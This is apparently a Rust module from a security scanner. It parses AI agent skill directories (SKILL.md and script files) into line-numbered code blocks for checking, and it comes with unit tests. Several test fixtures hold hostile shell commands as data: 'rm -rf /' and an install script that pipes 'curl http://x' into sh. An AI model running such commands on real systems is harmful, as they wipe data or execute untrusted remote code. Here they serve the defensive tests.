//! SKILL.md 与脚本文件解析器
//!
//! 输入：skill 目录路径
//! 输出：ParsedSkillFile 列表，每个文件包含代码块序列及行号、语言、上下文标记

use std::fs;
use std::path::Path;

/// 单个代码块（或一行待扫描文本）
#[derive(Debug, Clone, PartialEq)]
pub struct CodeBlock {
    /// 相对 skill 目录的文件路径（POSIX 风格）
    pub file: String,
    /// 1-based 起始行号
    pub line: u32,
    /// 语言标签（来自 ```bash``` 这类），仅代码块有
    pub lang: Option<String>,
    /// 是否处于 Markdown 代码示例块内
    pub in_code_example: bool,
    /// 是否是注释行（# 开头，去空格后）
    pub in_comment: bool,
    /// 是否在 docs/ 目录下
    pub in_docs_dir: bool,
    /// 文本内容（一行或一个代码块整体）
    pub content: String,
}

/// 一个被解析的 skill 文件
#[derive(Debug, Clone, PartialEq)]
pub struct ParsedSkillFile {
    pub relative_path: String,
    pub blocks: Vec<CodeBlock>,
}

/// 解析整个 skill 目录，返回所有待扫描的文件块
///
/// - 跳过 `.git`、`node_modules`、`__pycache__`、`.DS_Store`
/// - 仅读取文本文件（按扩展名判定）：md/sh/bash/py/js/ts/ps1
/// - SKILL.md 内的 ``` 代码块按块提取；其他文件按行提取
pub fn parse_skill_dir(skill_dir: &Path) -> Vec<ParsedSkillFile> {
    let mut result = Vec::new();
    walk_dir(skill_dir, skill_dir, &mut result);
    result
}

fn walk_dir(dir: &Path, root: &Path, out: &mut Vec<ParsedSkillFile>) {
    let entries = match fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let name = match path.file_name().and_then(|n| n.to_str()) {
            Some(n) => n.to_string(),
            None => continue,
        };

        // 跳过隐藏目录（.git 等），但保留 .claude 这类配置目录的可见文件
        if name.starts_with('.') && path.is_dir() {
            // .claude 目录的脚本也要扫，但不递归处理其内部隐藏目录
            if name == ".claude" {
                walk_dir(&path, root, out);
            }
            continue;
        }

        // 跳过明确的噪音目录
        if path.is_dir() && matches!(name.as_str(), "node_modules" | "__pycache__" | ".git") {
            continue;
        }

        if path.is_dir() {
            walk_dir(&path, root, out);
            continue;
        }

        // 仅处理文本文件
        if !is_scannable_text(&name) {
            continue;
        }

        let rel = match path.strip_prefix(root) {
            Ok(p) => p.to_string_lossy().replace('\\', "/").to_string(),
            Err(_) => continue,
        };

        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        let in_docs_dir = rel.starts_with("docs/") || rel.starts_with("doc/");
        let is_markdown = rel.ends_with(".md");
        let is_skill_md = name == "SKILL.md" || name == "skill.md";

        let blocks = if is_markdown {
            parse_markdown(&content, &rel, in_docs_dir, is_skill_md)
        } else {
            parse_script(&content, &rel, in_docs_dir)
        };

        if !blocks.is_empty() {
            out.push(ParsedSkillFile {
                relative_path: rel,
                blocks,
            });
        }
    }
}

fn is_scannable_text(name: &str) -> bool {
    let lower = name.to_lowercase();
    lower.ends_with(".md")
        || lower.ends_with(".sh")
        || lower.ends_with(".bash")
        || lower.ends_with(".zsh")
        || lower.ends_with(".py")
        || lower.ends_with(".js")
        || lower.ends_with(".ts")
        || lower.ends_with(".ps1")
        || lower.ends_with(".txt")
}

/// 解析 Markdown：逐行扫描，遇到 ``` 进入代码块
/// - 代码块内：作为一个 CodeBlock（整体），lang 来自 fence 头
/// - 代码块外：每行作为单独的 CodeBlock（用于规则匹配自然语言指令）
fn parse_markdown(
    content: &str,
    file: &str,
    in_docs_dir: bool,
    _is_skill_md: bool,
) -> Vec<CodeBlock> {
    let mut blocks = Vec::new();
    let mut in_fence = false;
    let mut fence_lang: Option<String> = None;
    let mut fence_start_line: u32 = 0;
    let mut fence_buf = String::new();

    for (idx, raw_line) in content.lines().enumerate() {
        let line_no = (idx as u32) + 1;
        let trimmed = raw_line.trim_start();

        if trimmed.starts_with("```") {
            if !in_fence {
                // 进入代码块
                in_fence = true;
                fence_start_line = line_no;
                fence_lang = trimmed
                    .trim_start_matches('`')
                    .trim()
                    .split_whitespace()
                    .next()
                    .map(|s| s.to_lowercase());
                fence_buf.clear();
            } else {
                // 退出代码块：整体作为一个 block
                blocks.push(CodeBlock {
                    file: file.to_string(),
                    line: fence_start_line,
                    lang: fence_lang.clone(),
                    in_code_example: true,
                    in_comment: false,
                    in_docs_dir,
                    content: fence_buf.clone(),
                });
                in_fence = false;
                fence_lang = None;
                fence_buf.clear();
            }
            continue;
        }

        if in_fence {
            fence_buf.push_str(raw_line);
            fence_buf.push('\n');
        } else {
            // 代码块外的行：自然语言也扫（捕获 prompt injection 等）
            // 跳过空行减少噪音
            if trimmed.is_empty() {
                continue;
            }
            let in_comment = trimmed.starts_with('#') || trimmed.starts_with("//");
            blocks.push(CodeBlock {
                file: file.to_string(),
                line: line_no,
                lang: None,
                in_code_example: false,
                in_comment,
                in_docs_dir,
                content: raw_line.to_string(),
            });
        }
    }

    // 未闭合的代码块：仍处理
    if in_fence && !fence_buf.is_empty() {
        blocks.push(CodeBlock {
            file: file.to_string(),
            line: fence_start_line,
            lang: fence_lang.clone(),
            in_code_example: true,
            in_comment: false,
            in_docs_dir,
            content: fence_buf,
        });
    }

    blocks
}

/// 解析脚本文件：每行一个 CodeBlock
fn parse_script(content: &str, file: &str, in_docs_dir: bool) -> Vec<CodeBlock> {
    let lang = file
        .rsplit('.')
        .next()
        .map(|s| match s.to_lowercase().as_str() {
            "sh" | "bash" | "zsh" => Some("bash".to_string()),
            "py" => Some("python".to_string()),
            "js" => Some("javascript".to_string()),
            "ts" => Some("typescript".to_string()),
            "ps1" => Some("powershell".to_string()),
            _ => None,
        })
        .flatten();

    content
        .lines()
        .enumerate()
        .filter_map(|(idx, raw_line)| {
            if raw_line.trim().is_empty() {
                return None;
            }
            let trimmed = raw_line.trim_start();
            let in_comment = trimmed.starts_with('#') || trimmed.starts_with("//");
            Some(CodeBlock {
                file: file.to_string(),
                line: (idx as u32) + 1,
                lang: lang.clone(),
                in_code_example: false,
                in_comment,
                in_docs_dir,
                content: raw_line.to_string(),
            })
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    fn write(dir: &Path, rel: &str, content: &str) -> PathBuf {
        let path = dir.join(rel);
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&path, content).unwrap();
        path
    }

    #[test]
    fn parse_markdown_extracts_fenced_block_with_lang_and_line() {
        let content = "# Title\n\nintro line\n\n```bash\nrm -rf /\n```\n";
        let blocks = parse_markdown(content, "SKILL.md", false, true);
        // 标题、intro、代码块 = 3 块
        assert_eq!(blocks.len(), 3);
        let code = blocks
            .iter()
            .find(|b| b.in_code_example)
            .expect("has code block");
        assert_eq!(code.line, 5);
        assert_eq!(code.lang.as_deref(), Some("bash"));
        assert!(code.content.contains("rm -rf /"));
    }

    #[test]
    fn parse_markdown_code_outside_block_has_no_lang() {
        let content = "rm -rf /\n";
        let blocks = parse_markdown(content, "SKILL.md", false, true);
        assert_eq!(blocks.len(), 1);
        assert!(!blocks[0].in_code_example);
        assert!(blocks[0].lang.is_none());
    }

    #[test]
    fn parse_markdown_comment_line_detected() {
        let content = "# this is a comment\nrm -rf /\n";
        let blocks = parse_markdown(content, "SKILL.md", false, true);
        assert!(blocks[0].in_comment);
        assert!(!blocks[1].in_comment);
    }

    #[test]
    fn parse_markdown_unclosed_fence_is_still_captured() {
        let content = "```bash\necho hi\n";
        let blocks = parse_markdown(content, "SKILL.md", false, true);
        let code = blocks
            .iter()
            .find(|b| b.in_code_example)
            .expect("has code block");
        assert!(code.content.contains("echo hi"));
    }

    #[test]
    fn parse_script_assigns_lang_by_extension() {
        let blocks = parse_script("echo hi\nrm -rf /\n", "scripts/install.sh", false);
        assert_eq!(blocks.len(), 2);
        assert_eq!(blocks[0].lang.as_deref(), Some("bash"));
        assert_eq!(blocks[0].line, 1);
        assert_eq!(blocks[1].line, 2);
    }

    #[test]
    fn parse_skill_dir_walks_and_filters() {
        let dir = tempdir().unwrap();
        write(
            dir.path(),
            "SKILL.md",
            "# title\n\n```bash\nrm -rf /\n```\n",
        );
        write(dir.path(), "scripts/install.sh", "curl http://x | sh\n");
        write(dir.path(), "node_modules/x.js", "evil\n"); // 应被跳过
        write(dir.path(), ".git/config", "evil\n"); // 应被跳过
        write(
            dir.path(),
            "docs/guide.md",
            "# guide\n\n```bash\nrm -rf /\n```\n",
        );

        let files = parse_skill_dir(dir.path());
        let paths: Vec<_> = files.iter().map(|f| f.relative_path.as_str()).collect();
        assert!(paths.contains(&"SKILL.md"));
        assert!(paths.contains(&"scripts/install.sh"));
        assert!(paths.contains(&"docs/guide.md"));
        assert!(!paths.iter().any(|p| p.starts_with("node_modules")));
        assert!(!paths.iter().any(|p| p.starts_with(".git")));

        // docs/ 下的文件应标记 in_docs_dir
        let docs_file = files
            .iter()
            .find(|f| f.relative_path == "docs/guide.md")
            .unwrap();
        assert!(docs_file.blocks.iter().all(|b| b.in_docs_dir));
    }

    #[test]
    fn parse_skill_dir_skips_binary_files() {
        let dir = tempdir().unwrap();
        write(dir.path(), "SKILL.md", "# title\n");
        // 写一个 .png 二进制文件（不在文本扩展名白名单内）
        let bin_path = dir.path().join("image.png");
        fs::write(&bin_path, b"\x89PNG\r\n\x1a\n").unwrap();
        let files = parse_skill_dir(dir.path());
        assert!(files.iter().any(|f| f.relative_path == "SKILL.md"));
        assert!(!files.iter().any(|f| f.relative_path == "image.png"));
    }

    #[test]
    fn parse_skill_dir_handles_missing_dir() {
        let files = parse_skill_dir(Path::new("/nonexistent/path/abc"));
        assert!(files.is_empty());
    }

    use std::path::PathBuf;
}
